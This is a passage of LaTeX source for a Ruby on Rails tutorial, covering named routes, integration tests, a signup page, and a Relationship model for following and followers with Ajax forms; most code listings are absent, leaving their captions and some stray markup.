Applying this rule change to the remaining static page routes from Listing~\ref{code:contact_route} gives Listing~\ref{code:static_page_routes}.
Routes for static pages.
With the routes defined in Listing~\ref{code:static_page_routes}, we're now in a position to use the resulting named routes in the site layout.
This simply involves filling in the second arguments of the \kode{link\_to} functions with the proper named routes.
For example, we'll convert
and so on.
While we're at it, we'll follow a common web convention and link the logo to the Home page as well.
Header partial with links.
Footer partial with links.
With that, our layout has links to all the static pages created in Chapter~\ref{cha:static_pages}, so that, for example, \href{http://localhost:3000/about}{/about} goes to the About page (Figure~\ref{fig:about_page}).
The About page at \href{http://localhost:3000/about}{/about}.
Now that we've filled in several of the layout links, it's a good idea to test them to make sure they're working correctly.
We could do this by hand with a browser, first visiting the root path and then checking the links by hand, but this quickly becomes cumbersome.
Instead, we'll simulate the same series of steps using an \emph{integration test}, which allows us to write an end-to-end test of our application's behavior.
We can get started by generating a template test, which we'll call \kode{site\_layout}:
Note that the Rails generator automatically appends \kode{\_test} to the name of the test file.
Our plan for testing the layout links involves checking the HTML structure of our site:
Get the root path (Home page)
Verify that the right page template is rendered
Check for the correct links to the Home, Help, About, and Contact pages
Listing~\ref{code:layout_links_test} shows how we can use Rails integration tests to translate these steps into code, beginning with the \kode{assert\_template} method to verify that the Home page is rendered using the correct view
Some developers insist that a single test shouldn't contain multiple assertions.
I find this practice to be unnecessarily complicated, while also incurring an extra overhead if there are common setup tasks needed before each test.
In addition, a well-written test tells a coherent story, and breaking it up into individual pieces disrupts the narrative.
A test for the links on the layout. 
Listing~\ref{code:layout_links_test} uses some of the more advanced options of the \kode{assert\_select} method, seen before in Listing~\ref{code:title_tests} and Listing~\ref{code:contact_page_test}.
In this case, we use a syntax that allows us to test for the presence of a particular link--URL combination by specifying the tag name~\kode{a} and attribute~\kode{href}, as in
Here Rails automatically inserts the value of \kode{about\_path} in place of the question mark (escaping any special characters if necessary), thereby checking for an HTML tag of the form
Note that the assertion for the root path verifies that there are \emph{two} such links (one each for the logo and navigation menu element):
This ensures that both links to the Home page defined in Listing~\ref{code:header_partial_links} are present.
Some more uses of \kode{assert\_select} appear in Table~\ref{table:assert_select}.
Matching HTML
Some uses of \kode{assert\_select}.
To check that the new test in Listing~\ref{code:layout_links_test} passes, we can run just the integration tests using the following Rake task:
If all went well, you should run the full test suite to verify that all the tests are \passing:
With the added integration test for layout links, we are now in a good position to catch regressions quickly using our test suite.
As a capstone to our work on the layout and routing, in this section we'll make a route for the signup page, which will mean creating a second controller along the way.
This is a first important step toward allowing users to register for our site; we'll take the next step, modeling users, in Chapter~\ref{cha:modeling_users}, and we'll finish the job in Chapter~\ref{cha:sign_up}.
<n><n>    \subsection{Users controller} % (fold)<n>    \label{sec:users_controller}<n><n>
We created our first controller, the Static Pages controller, in Section~\ref{sec:static_pages}.
It's time to create a second one, the Users controller.
Following the conventional \href{http://en.wikipedia.org/wiki/Representational_State_Transfer}{REST architecture} favored by Rails, we'll call the action for new users \kode{new}, which we can arrange to create automatically by passing \kode{new} as an argument to \kode{generate}.
The result is shown in Listing~\ref{code:generate_users_controller}.
Generating a Users controller (with a \kode{new} action).
      create  app/controllers/users_controller.rb
      invoke  erb
      create    app/views/users
      create    app/views/users/new.html.erb
      invoke  helper
      create    app/helpers/users_helper.rb
      invoke    test_unit
      invoke  assets
      invoke    coffee
      create      app/assets/javascripts/users.js.coffee
      invoke    scss
      create      app/assets/stylesheets/users.css.scss
As required, Listing~\ref{code:generate_users_controller} creates a Users controller with a \kode{new} action (Listing~\ref{code:initial_users_controller}) and a stub user view (Listing~\ref{code:initial_new_action}).
It also creates a minimal test for the new user page (Listing~\ref{code:user_new_test}), which should currently pass:
The initial Users controller, with a \kode{new} action.
The initial \kode{new} view for Users.
A test for the new user page. 
With the code from Section~\ref{sec:users_controller}, we already have a working page for new users at /users/new, but recall from Table~\ref{table:url_mapping} that we want the URL to be /signup instead.
We'll follow the examples from Listing~\ref{code:static_page_routes} and add a \kode{get '/signup'} rule for the signup URL, as shown in Listing~\ref{code:signup_route}.
A route for the signup page.
Next, we'll use the newly defined named route to add the proper link to the button on the Home page.
As with the other routes, \kode{get 'signup'} automatically gives us the named route \kode{signup\_path}, which we put to use in Listing~\ref{code:home_page_signup_link}.
Adding a test for the signup page is left as an exercise (Section~\ref{sec:layout_exercises}.)
Linking the button to the signup page.
Finally, we'll add a custom stub view for the signup page (Listing~\ref{code:initial_signup_page}).
The initial (stub) signup page.
With that, we're done with the links and named routes, at least until we add a route for logging in (Chapter~\ref{cha:log_in_log_out}).
The resulting new user page (at the URL /signup) appears in Figure~\ref{fig:new_signup_page}.
The new signup page at \href{http://localhost:3000/signup}{/signup}.
In this chapter, we've hammered our application layout into shape and polished up the routes.
The rest of the book is dedicated to fleshing out the sample application: first, by adding users who can sign up, log in, and log out; next, by adding user microposts; and, finally, by adding the ability to follow other users.
At this point, if you are using Git, you should merge your changes back into the master branch:
Then push up to Bitbucket:
Finally, deploy to Heroku:
The result of the deployment should be a working sample application on the production server (Figure~\ref{fig:layout_production}).
The sample application in production.
If you run into trouble, try running
to debug the error using the Heroku logfile.
)<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:filling_in_the_layout_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Using HTML5, we can define a site layout with logo, header, footer, and main body content.
Rails partials are used to place markup in a separate file for convenience.
CSS allows us to style the site layout based on CSS classes and ids.
The Bootstrap framework makes it easy to make a nicely designed site quickly.
Sass and the asset pipeline allow us to eliminate duplication in our CSS while packaging up the results efficiently for production.
Rails allows us to define custom routing rules, thereby providing named routes.
Integration tests effectively simulate a browser clicking from page to page.
As suggested in Section~\ref{sec:sass}, go through the steps to convert the footer CSS from Listing~\ref{code:footer_css} to Listing~\ref{code:refactored_scss} to SCSS by hand.
In the integration test from Listing~\ref{code:layout_links_test}, add code to visit the signup page using the \kode{get} method and verify that the resulting page title is correct.
It's convenient to use the \kode{full\_title} helper in the tests by including the Application helper into the test helper, as shown in Listing~\ref{code:test_helper_application_helper}.
We can then test for the right title using code like Listing~\ref{code:layout_links_test_signup_full_title_helper} (which extends the solution from the previous exercise).
This is brittle, though, because now any typo in the base title (such as ``Ruby on Rails Tutoial'') won't be caught by the test suite.
Fix this problem by writing a direct test of the \kode{full\_title} helper, which involves creating a file to test the application helper and then filling in the code indicated with \kode{FILL\_IN} in Listing~\ref{code:full_title_helper_tests}.
(Listing~\ref{code:full_title_helper_tests} uses \kode{assert\_equal <expected>, <actual>}, which verifies that the expected result \linebreak matches the actual value when compared with the \kode{==} operator.)
Including the Application helper in tests.
Using the \kode{full\_title} helper in a test. 
A direct test the \kode{full\_title} helper.
In this chapter, we will complete the sample application by adding a social layer that allows users to follow (and unfollow) other users, resulting in each user's Home page displaying a status feed of the followed users' microposts.
We'll start by learning how to model relationships between users in Section~\ref{sec:the_relationship_model}, and we'll build the corresponding web interface in Section~\ref{sec:a_web_interface_for_following_and_followers} (including an introduction to Ajax).
We'll end by developing a fully functional status feed in Section~\ref{sec:the_status_feed}.
This final chapter contains some of the most challenging material in the tutorial, including some Ruby/SQL trickery to make the status feed.
Through these examples, you will see how Rails can handle even rather intricate data models, which should serve you well as you go on to develop your own applications with their own specific requirements.
To help with the transition from tutorial to independent development, Section~\ref{sec:following_conclusion} offers some pointers to more advanced resources.
Because the material in this chapter is particularly challenging, before writing any code we'll pause for a moment and take a tour of the interface.
As in previous chapters, at this early stage we'll represent pages using mockups
The full page flow runs as follows: a user (John Calvin) starts at his profile page (Figure~\ref{fig:page_flow_profile_mockup}) and navigates to the Users page (Figure~\ref{fig:page_flow_user_index_mockup}) to select a user to follow.
Calvin navigates to the profile of a second user, Thomas Hobbes (Figure~\ref{fig:page_flow_other_profile_follow_button}), clicking on the ``Follow'' button to follow that user.
This changes the ``Follow'' button to ``Unfollow'' and increments Hobbes's ``followers'' count by one (Figure~\ref{fig:page_flow_other_profile_unfollow_button_mockup}).
Navigating to his home page, Calvin now sees an incremented ``following'' count and finds Hobbes's microposts in his status feed (Figure~\ref{fig:page_flow_home_page_feed_mockup}).
The rest of this chapter is dedicated to making this page flow actually work.
A current user's profile.
Finding a user to follow.
The profile of a user to follow, with a follow button.
A profile with an unfollow button and incremented followers count.
The Home page with status feed and incremented following count.
\label{fig:page_flow_home_page_feed_mockup}}<n>\end{figure}<n><n><n>  \section{The Relationship model} % (fold)<n>  \label{sec:the_relationship_model}<n><n>
Our first step in implementing following users is to construct a data model, which is not as straightforward as it seems.
As we will see, there is a problem with this approach, and we'll learn how to fix it using \kode{has\_many :through}.
As usual, Git users should create a new topic branch:
following-users
<n>\end{code}<n><n>    \subsection{A problem with the data model (and a solution)} % (fold)<n>    \label{sec:a_problem_with_the_data_model}<n><n>
As a first step toward constructing a data model for following users, let's examine a typical case.
For instance, consider a user who follows a second user: we could say that, e.g., Calvin is following Hobbes, and Hobbes is followed by Calvin, so that Calvin is the \emph{follower} and Hobbes is \emph{followed}.
Using Rails' default pluralization convention, the set of all users following a given user is that user's \emph{followers}, and \kode{hobbes.followers} is an array of those users.
Unfortunately, the reverse doesn't work: by default, the set of all followed users would be called the \emph{followeds}, which is ungrammatical and clumsy.
We'll adopt Twitter's convention and call them \emph{following} (as in ``50 following, 75 followers''), with a corresponding \kode{calvin.following} array.
This discussion suggests modeling the followed users as in Figure~\ref{fig:naive_user_has_many_following}, with a \kode{following} table and a \kode{has\_many} association.
For simplicity, Figure~\ref{fig:naive_user_has_many_following} omits the \kode{following} table's~\kode{id} column.
In addition, since each row is a user, we would need to include the user's other attributes, including the name, email, password, etc.
The problem with the data model in Figure~\ref{fig:naive_user_has_many_following} is that it is terribly redundant: each row contains not only each followed user's id, but all their other information as well---all of which is \emph{already} in the \kode{users} table.
Even worse, to model user \emph{followers} we would need a separate, similarly redundant \kode{followers} table.
Finally, this data model is a maintainability nightmare: each time a user changed (say) their name, we would need to update not just the user's record in the \kode{users} table but also \emph{every row containing that user}<n>in both the \kode{following} and \kode{followers} tables.
The problem here is that we are missing an underlying abstraction.
One way to find the proper model is to consider how we might implement the act of \emph{following} in a web application.
Recall from Section~\ref{sec:a_users_resource} that the REST architecture involves \emph{resources} that are created and destroyed.
This leads us to ask two questions: When a user follows another user, what is being created?
When a user \emph{un}follows another user, what is being destroyed?
Upon reflection, we see that in these cases the application should either create or destroy a \emph{relationship} between two users.
A user then has many relationships, and has many \kode{following} (or \kode{followers}) \emph{through} these relationships.
There's an additional detail we need to address regarding our application's data model: unlike symmetric Facebook-style friendships, which are always reciprocal (at least at the data-model level), Twitter-style following relationships are potentially \emph{asymmetric}---Calvin can follow Hobbes without Hobbes following Calvin.
To distinguish between these two cases, we'll adopt the terminology of \emph{active} and \emph{passive} relationships: if Calvin is following Hobbes but not vice versa, Calvin has an active relationship with Hobbes and Hobbes has a passive relationship with Calvin
Thanks to reader Paul Fioravanti for suggesting this terminology.
We'll focus now on using active relationships to generate a list of followed users, and consider the passive case in Section~\ref{sec:followers}.
A diagram of the data model appears in Figure~\ref{fig:user_has_many_following}.
A model of followed users through active relationships.
Because we'll end up using the same database table for both active and passive relationships, we'll use the generic term \emph{relationship} for the table name, with a corresponding Relationship model.
The result is the Relationship data model shown in Figure~\ref{fig:relationship_model}.
We'll see starting in Section~\ref{sec:following} how to use the Relationship model to simulate both Active Relationship and Passive Relationship models.
The Relationship data model.
To get started with the implementation, we first generate a migration corresponding to Figure~\ref{fig:relationship_model}:
as shown in Listing~\ref{code:relationships_migration}.
Adding indices for the \kode{relationships} table.
(Compare to the email uniqueness index from Listing~\ref{code:email_uniqueness_index} and the multiple-key index in Listing~\ref{code:micropost_migration}.)
As we'll see starting in Section~\ref{sec:following}, our user interface won't allow this to happen, but adding a unique index arranges to raise an error if a user tries to create duplicate relationships anyway (for example, by using a command-line tool such as \kode{curl}).
To create the \kode{relationships} table, we migrate the database as usual:
Before implementing user following and followers, we first need to establish the association between users and relationships.
A user \kode{has\_many} relationships, and---since relationships involve \emph{two} users---a relationship \kode{belongs\_to} both a follower and a followed user.
As with microposts in Section~\ref{sec:user_micropost_associations}, we will create new relationships using the user association, with code such as
At this point, you might expect application code as in Section~\ref{sec:user_micropost_associations}, and it's similar, but there are two key differences.
First, in the case of the user/micropost association we could write
Technically, Rails converts the argument of \kode{has\_many} to a class name using the \kode{classify} method, which converts \kode{"foo\_bars"} to \kode{"FooBar"}.
even though the underlying model is called Relationship.
We will thus have to tell Rails the model class name to look for.
Second, before we wrote
in the Micropost model.
This works because the \kode{microposts} table has a \kode{user\_id} attribute  to identify the user (Section~\ref{sec:the_basic_model}).
An id used in this manner to connect two database tables is known as a \emph{foreign key}, and when the foreign key for a User model object is \kode{user\_id}, Rails infers the association automatically: by default, Rails expects a foreign key of the form \kode{<class>\_id}, where \kode{<class>} is the lower-case version of the class name
Technically, Rails uses the \kode{underscore} method to convert the class name to an id.
For example, \kode{"FooBar".underscore} is \kode{"foo\_bar"}, so the foreign key for a \kode{FooBar} object would be \kode{foo\_bar\_id}.
In the present case, although we are still dealing with users, the user following another user is now identified with the foreign key \kode{follower\_id}, so we have to tell that to Rails.
The result of the above discussion is the user/relationship association shown in Listing~\ref{code:user_relationships_association} and Listing~\ref{code:relationship_belongs_to}.
Implementing the active relationships \kode{has\_many} association.
(Since destroying a user should also destroy that user's relationships, we've added \kode{dependent: :destroy} to the association.)
Adding the follower \kode{belongs\_to} association to the Relationship model.
The \kode{followed} association isn't actually needed until Section~\ref{sec:following}, but the parallel follower/followed structure is clearer if we implement them both at the same time.
The relationships in Listing~\ref{code:user_relationships_association} and Listing~\ref{code:relationship_belongs_to} give rise to methods analogous to the ones we saw in Table~\ref{table:association_methods}, as shown in Table~\ref{table:association_methods_relationships}.
Returns the follower
Returns the followed user
Creates an active relationship associated with \kode{user}
Creates an active relationship associated with \kode{user} (exception on failure)
Returns a new Relationship object associated with \kode{user}
A summary of user/active relationship association methods.
Before moving on, we'll add a couple of Relationship model validations for completeness.
The tests (Listing~\ref{code:relationship_validation_tests}) and application code (Listing~\ref{code:relationship_validations}) are straightforward.
As with the generated user fixture (Listing~\ref{code:default_fixtures}), the generated relationship fixture also violates the uniqueness constraint imposed by the corresponding migration (Listing~\ref{code:relationships_migration}).
The solution (removing the fixture contents as in Listing~\ref{code:empty_fixtures}) is also the same (Listing~\ref{code:empty_relationship_fixture}).
Testing the Relationship model validations.
Adding the Relationship model validations.
Removing the contents of the relationship fixture.
We come now to the heart of the Relationship associations: \kode{following} and \kode{followers}.
Here we will use \kode{has\_many :through} for the first time: a user has many following \emph{through} relationships, as illustrated in Figure~\ref{fig:user_has_many_following}.
By default, in a \kode{has\_many :through} association Rails looks for a foreign key corresponding to the singular version of the association.
In other words, with code like
Rails would see ``followeds'' and use the singular ``followed'', assembling a collection using the \kode{followed\_id} in the \kode{relationships} table.
But, as noted in Section~\ref{sec:a_problem_with_the_data_model}, \kode{user.followeds} is rather awkward, so we'll write \kode{user.following} instead.
Naturally, Rails allows us to override the default, in this case using the \kode{source} parameter (as shown in Listing~\ref{code:has_many_following_through_active_relationships}), which explicitly tells Rails that the source of the \kode{following} array is the set of \kode{followed}~ids.
Adding the User model \kode{following} association.
The association defined in Listing~\ref{code:has_many_following_through_active_relationships} leads to a powerful combination of Active Record and array-like behavior.
For example, we can check if the followed users collection includes another user with the \kode{include?}\ method (Section~\ref{sec:arrays_and_ranges}), or find objects through the association:
Although in many contexts we can effectively treat \kode{following} as an array, Rails is smart about how it handles things under the hood.
For example, code like
looks like it might have to pull all the followed users out of the database to apply the \kode{include?}\ method, but in fact for efficiency Rails arranges for the comparison to happen directly in the database.
(Compare to the code in Section~\ref{sec:rendering_microposts}, where we saw that
performs the count directly in the database.)
We'll also add an associated \kode{following?}\ boolean method to test if one user is following another
Once you have a lot of experience modeling a particular domain, you can often guess such utility methods in advance, and even when you can't you'll often find yourself writing them to make the tests cleaner.
In this case, though, it's OK if you wouldn't have guessed them.
Software development is usually an iterative process---you write code until it starts getting ugly, and then you refactor it---but for brevity the tutorial presentation is streamlined a bit.
This is exactly the kind of situation where I like to write some tests first.
The reason is that we are quite far from writing a working web interface for following users, but it's hard to proceed without some sort of \emph{client} for the code we're developing.
In this case, it's easy to write a short test for the User model, in which we use \kode{following?}\ to make sure the user isn't following the other user, use \kode{follow} to follow another user, use \kode{following?}\ to verify that the operation succeeded, and finally \kode{unfollow} and verify that it worked.
The result appears in Listing~\ref{code:utility_method_tests}
Tests for some ``following'' utility methods. 
as shown in Listing~\ref{code:follow_unfollow_following}.
(Note that we have omitted the user \kode{self} variable whenever possible.)
Utility methods for following. 
    following
With the code in Listing~\ref{code:follow_unfollow_following}, the tests should be \passing:
 (end)<n><n>    \subsection{Followers} % (fold)<n>    \label{sec:followers}<n><n>
The final piece of the relationships puzzle is to add a \kode{user.followers} \linebreak method to go with \kode{user.following}.
You may have noticed from Figure~\ref{fig:user_has_many_following} that all the information needed to extract an array of followers is already present in the \kode{relationships} table
The data model then appears as in Figure~\ref{fig:user_has_many_followers}.
A model for user followers through passive relationships.
The implementation of the data model in Figure~\ref{fig:user_has_many_followers} parallels Listing~\ref{code:has_many_following_through_active_relationships} exactly, as seen in Listing~\ref{code:has_many_following_through_passive_relationships}.
Implementing \kode{user.followers} using passive relationships.
This is because, in the case of a \kode{:followers} attribute, Rails will singularize ``followers'' and automatically look for the foreign key \kode{follower\_id} in this case.
Listing~\ref{code:has_many_following_through_active_relationships} keeps the \kode{:source} key to emphasize the parallel structure with the \kode{has\_many :following} association.
as shown in Listing~\ref{code:followers_test}.
(Listing~\ref{code:followers_test} might have used a \kode{followed\_by?}\ method to complement the \kode{following?}\ method, but it turns out we won't need it in our application.)
A test for \kode{followers}. 
Listing~\ref{code:followers_test} adds only one line to the test from Listing~\ref{code:utility_method_tests}, but so many things have to go right to get it to pass that it's a very sensitive test of the code in Listing~\ref{code:has_many_following_through_passive_relationships}.
At this point, the full test suite should be \passing:
followers
Section~\ref{sec:the_relationship_model} placed rather heavy demands on our data modeling skills, and it's fine if it takes a while to soak in.
In fact, one of the best ways to understand the associations is to use them in the web interface.
In the introduction to this chapter, we saw a preview of the page flow for user following.
In this section, we will implement the basic interface and following/unfollowing functionality shown in those mockups.
We will also make separate pages to show the user following and followers arrays.
In Section~\ref{sec:the_status_feed}, we'll complete our sample application by adding the user's status feed.
As in previous chapters, we will find it convenient to use the seed data Rake task to fill the database with sample relationships.
This will allow us to design the look and feel of the web pages first, deferring the back-end functionality until later in this section.
Code to seed the following relationships appear in Listing~\ref{code:sample_relationships}.
Here we somewhat arbitrarily arrange for the first user to follow users~3 through 51, and then have users 4 through 41 follow that user back.
The resulting relationships will be sufficient for developing the application interface.
Adding following/follower relationships to the sample data.
To execute the code in Listing~\ref{code:sample_relationships}, we reseed the database as usual:
Now that our sample users have both followed users and followers, we need to update the profile page and Home page to reflect this.
We'll start by making a partial to display the following and follower statistics on the profile and home pages.
We'll next add a follow/unfollow form, and then make dedicated pages for showing ``following'' (followed users) and ``followers''.
As noted in Section~\ref{sec:a_problem_with_the_data_model}, we'll adopt Twitter's convention of using ``following'' as a label for followed users, as in ``50 following''.
This usage is reflected in the mockup sequence starting in Figure~\ref{fig:page_flow_profile_mockup} and shown in close-up in Figure~\ref{fig:stats_partial_mockup}.
A mockup of the stats partial.
The stats in Figure~\ref{fig:stats_partial_mockup} consist of the number of users the current user is following and the number of followers, each of which should be a link to its respective dedicated display page.
This time, although we'll defer the actual pages to Section~\ref{sec:following_and_followers_pages}, we'll make the routes now, as seen in Listing~\ref{code:following_followers_actions_routes}.
This code uses the \kode{:member} method inside a \kode{resources} \emph{block}, which we haven't seen before, but see if you can guess what it does.
Adding \kode{following} and \kode{followers} actions to the Users controller.
/users/1/following
Since both pages will be \emph{showing} data, the proper HTTP verb is a \texttt{GET} request, so we use the \kode{get} method to arrange for the URLs to respond appropriately.
Meanwhile, the \kode{member} method arranges for the routes to respond to URLs containing the user id.
The other possibility, \kode{collection}, works without the id, so that
would respond to the URL /users/tigers (presumably to display all the tigers in our application)
For more details on such routing options, see the \href{http://guides.rubyonrails.org/routing.html}{Rails Guides article on ``Rails Routing from the Outside In''}.
A table of the routes generated by Listing~\ref{code:following_followers_actions_routes} appears in Table~\ref{table:following_routes}.
Note the named routes for the followed user and followers pages, which we'll put to use shortly.
/users/1/followers
RESTful routes provided by the custom rules in resource in Listing~\ref{code:following_followers_actions_routes}.
With the routes defined, we are now in a position to define the stats partial, which involves a couple of links inside a div, as shown in Listing~\ref{code:stats_partial}.
A partial for displaying follower stats.
</strong>
    followers
Since we will be including the stats on both the user show pages and the home page, the first line of Listing~\ref{code:stats_partial} picks the right one using
Note also that the following/follower counts are calculated through the associations using
Compare these to the microposts count from Listing~\ref{code:user_show_microposts}, where we wrote
to count the microposts.
As in that case, Rails calculates the count directly in the database for efficiency.
One final detail worth noting is the presence of CSS ids on some elements, as in
This is for the benefit of the Ajax implementation in Section~\ref{sec:a_working_follow_button_with_ajax}, which accesses elements on the page using their unique ids.
With the partial in hand, including the stats on the Home page is easy, as shown in Listing~\ref{code:home_page_stats}.
Adding follower stats to the Home page.
</section>
</aside>
To style the stats, we'll add some SCSS, as shown in Listing~\ref{code:stats_css} (which contains all the stylesheet code needed in this chapter).
The resulting Home page appears in Figure~\ref{fig:home_page_follow_stats}.
SCSS for the Home page sidebar.
The Home page with follow stats.
We'll render the stats partial on the profile page in a moment, but first let's make a partial for the follow/unfollow button, as shown in Listing~\ref{code:follow_form_partial}.
A partial for a follow/unfollow form.
This does nothing but defer the real work to \kode{follow} and \kode{unfollow} partials, which need new routes for the Relationships resource, which follows the Microposts resource example (Listing~\ref{code:microposts_resource}), as seen in Listing~\ref{code:relationships_resource}.
Adding the routes for user relationships.
The follow/unfollow partials themselves are shown in Listing~\ref{code:follow_form} and Listing~\ref{code:unfollow_form}.
A form for following a user.
A form for unfollowing a user.
These two forms both use \kode{form\_for} to manipulate a Relationship model object; the main difference between the two is that Listing~\ref{code:follow_form} builds a \emph{new} relationship, whereas Listing~\ref{code:unfollow_form} finds the existing relationship.
Naturally, the former sends a \texttt{POST} request to the Relationships controller to \kode{create} a relationship, while the latter sends a \texttt{DELETE} request to \kode{destroy} a relationship.
(We'll write these actions in Section~\ref{sec:a_working_follow_button_the_standard_way}.)
Finally, you'll note that the follow form doesn't have any content other than the button, but it still needs to send the \kode{followed\_id} to the controller.
We accomplish this with the \kode{hidden\_field\_tag} method in Listing~\ref{code:follow_form}, which produces HTML of the form
As we saw in Section~\ref{sec:resetting_the_password} (Listing~\ref{code:password_reset_form}), the hidden \kode{input} tag puts the relevant information on the page without displaying it in the browser.
We can now include the follow form and the following statistics on the user profile page simply by rendering the partials, as shown in Listing~\ref{code:user_follow_form_profile_stats}.
Profiles with follow and unfollow buttons, respectively, appear in Figure~\ref{fig:profile_follow_button} and Figure~\ref{fig:profile_unfollow_button}.
Adding the follow form and follower stats to the user profile page.
<section>
</h1>
</ol>
A user profile with a follow button (\href{http://localhost:3000/users/2}{/users/2}).
A user profile with an unfollow button (\href{http://localhost:3000/users/5}{/users/5}).
We'll get these buttons working soon enough---in fact, we'll do it two ways, the standard way (Section~\ref{sec:a_working_follow_button_the_standard_way}) and using Ajax (Section~\ref{sec:a_working_follow_button_with_ajax})---but first we'll finish the HTML interface by making the following and followers pages.
Pages to display followed users and followers will resemble a hybrid of the user profile page and the user index page (Section~\ref{sec:users_index}), with a sidebar of user information (including the following stats) and a list of users.
In addition, we'll include a raster of smaller user profile image links in the sidebar.
Mockups matching these requirements appear in Figure~\ref{fig:following_mockup} (following) and Figure~\ref{fig:followers_mockup} (followers).
A mockup of the user following page.
A mockup of the user followers page.
Our first step is to get the following and followers links to work.
We'll follow Twitter's lead and have both pages require user login.
As with most previous examples of access control, we'll write the tests first, as shown in Listing~\ref{code:following_followers_authorization_test}.
Tests for the authorization of the following and followers pages. 
The only tricky part of the implementation is realizing that we need to add two new actions to the Users controller.
Based on the routes defined in Listing~\ref{code:following_followers_actions_routes}, we need to call them \kode{following} and \kode{followers}.
Each action needs to set a title, find the user, retrieve either \kode{@user.following} or \kode{@user.followers} (in paginated form), and then render the page.
The result appears in Listing~\ref{code:following_followers_actions}
The \kode{following} and \kode{followers} actions.
In contrast, both actions in Listing~\ref{code:following_followers_actions} make an \emph{explicit} call to \kode{render}, in this case rendering a view called \kode{show\_follow}, which we must create.
The reason for the common view is that the ERb is nearly identical for the two cases, and Listing~\ref{code:show_follow_view} covers them both.
The \kode{show\_follow} view used to render following and followers.
The actions in Listing~\ref{code:following_followers_actions} render the view from Listing~\ref{code:show_follow_view} in two contexts, ``following'' and ``followers'', with the results shown in Figure~\ref{fig:user_following} and Figure~\ref{fig:user_followers}.
Note that nothing in the above code uses the current user, so the same links work for other users, as shown in Figure~\ref{fig:different_user_followers}.
Showing the users the given user is following.
Showing the given user's followers.
Showing a different user's followers.
Now that we have working following and followers pages, we'll write a couple of short integration tests to verify their behavior.
They are designed to be a sanity check, not to be comprehensive.
Indeed, as noted in Section~\ref{sec:layout_link_tests}, comprehensive tests of things like HTML structure are likely to be brittle and thus counter-productive.
Our plan in the case of following/followers pages is to check the number is correctly displayed and that links with the right URLs appear on the page.
To get started, we'll generate an integration test as usual:
Next, we need to assemble some test data, which we can do by adding some relationships fixtures to create following/follower relationships.
Recall from Section~\ref{sec:profile_micropost_tests} that we can use code like
to associate a micropost with a given user.
In particular, we can write
Applying this idea to the relationships fixtures gives the associations in Listing~\ref{code:relationships_fixtures}.
Relationships fixtures for use in following/follower tests.
To test for the right count, we can use the same \kode{assert\_match} method we used in Listing~\ref{code:user_profile_test} to test for the display of the number of microposts on the user profile page.
Adding in assertions for the right links yields the tests shown in Listing~\ref{code:following_tests}.
Tests for following/follower pages. 
In Listing~\ref{code:following_tests}, note that we include the assertion
which is included to make sure that
isn't \href{https://en.wikipedia.org/wiki/Vacuous_truth}{vacuously true} (and similarly for \kode{followers}).
The test suite should now be \passing:
Now that our views are in order, it's time to get the follow/unfollow buttons working.
Because following and unfollowing involve creating and destroying relationships, we need a Relationships controller, which we generate as usual
As we'll see in Listing~\ref{code:relationships_controller}, enforcing access control on the Relationships controller actions won't much matter, but we'll still follow our previous practice of enforcing the security model as early as possible.
In particular, we'll check that attempts to access actions in the Relationships controller require a logged-in user (and thus get redirected to the login page), while also not changing the Relationship count, as shown in Listing~\ref{code:relationships_access_control}.
Basic access control tests for relationships. 
We can get the tests in Listing~\ref{code:relationships_access_control} to pass by adding the \kode{logged\_in\_user} before filter (Listing~\ref{code:relationships_controller}).
Access control for relationships. 
The full implementation appears in Listing~\ref{code:relationships_controller_following}.
The Relationships controller.
We can see from Listing~\ref{code:relationships_controller_following} why the security issue mentioned above is minor: if an unlogged-in user were to hit either action directly (e.g., using a command-line tool like \kode{curl}), \kode{current\_user} would be \kode{nil}, and in both cases the action's second line would raise an exception, resulting in an error but no harm to the application or its data.
It's best not to rely on that, though, so we've taken the extra step and added an additional layer of security.
With that, the core follow/unfollow functionality is complete, and any user can follow or unfollow any other user, as you can verify by clicking the corresponding buttons in your browser.
(We'll write integration tests to verify this behavior in Section~\ref{sec:following_tests}.)
An unfollowed user.
The result of following an unfollowed user.
Although our user following implementation is complete as it stands, we have one bit of polish left to add before starting work on the status feed.
You may have noticed in Section~\ref{sec:a_working_follow_button_the_standard_way} that both the \kode{create} and \kode{destroy} actions in the Relationships controller simply redirect \emph{back} to the original profile.
In other words, a user starts on another user's profile page, follows the other user, and is immediately redirected back to the original page.
It is reasonable to ask why the user needs to leave that page at all.
This is exactly the problem solved by \emph{Ajax}, which allows web pages to send requests asynchronously to the server without leaving the page
Because it is nominally an acronym for \emph{asynchronous JavaScript and XML}, Ajax is sometimes misspelled ``AJAX'', even though the \href{http://www.adaptivepath.com/ideas/ajax-new-approach-web-applications/}{original Ajax article} spells it as ``Ajax'' throughout.
Because adding Ajax to web forms is a common practice, Rails makes Ajax easy to implement.
Indeed, updating the follow/unfollow form partials is trivial: just change
form_for
and Rails \href{http://catb.org/jargon/html/A/automagically.html}{automagically} uses Ajax
A form for following a user using Ajax.
A form for unfollowing a user using Ajax.
The actual HTML generated by this ERb isn't particularly relevant, but you might be curious, so here's a peek at a schematic view (details may differ):
</form>
This sets the variable \kode{data-remote="true"} inside the form tag, which tells Rails to allow the form to be handled by JavaScript.
By using a simple HTML property instead of inserting the full JavaScript code (as in previous versions of Rails), Rails follows the philosophy of \href{http://railscasts.com/episodes/205-unobtrusive-javascript}{\emph{unobtrusive JavaScript}}.
Having updated the form, we now need to arrange for the Relationships controller to respond to Ajax requests.
We can do this using the \kode{respond\_to} method, responding appropriately depending on the type of request. The general pattern looks like this:
The syntax is potentially confusing, and it's important to understand that in the code above only \emph{one} of the lines gets executed.
(In this sense, \kode{respond\_to} is more like an if-then-else statement than a series of sequential lines.)
Adapting the Relationships controller to respond to Ajax involves adding \kode{respond\_to} as above to the \kode{create} and \kode{destroy} actions from Listing~\ref{code:relationships_controller_following}.
The result appears as in Listing~\ref{code:relationships_controller_ajax}.
Note the change from the local variable \kode{user} to the instance variable \kode{@user}; in Listing~\ref{code:relationships_controller_following} there was no need for an instance variable, but now such a variable is necessary for use in Listing~\ref{code:follow_form_ajax} and Listing~\ref{code:unfollow_form_ajax}.
Responding to Ajax requests in the Relationships controller.
The actions in Listing~\ref{code:relationships_controller_ajax} degrade gracefully, which means that they work fine in browsers that have JavaScript disabled (although a small amount of configuration is necessary, as shown in Listing~\ref{code:degrade_gracefully}).
Configuration needed for graceful degradation of form submission.
# Include the authenticity token in remote forms.
On the other hand, we have yet to respond properly when JavaScript is enabled.
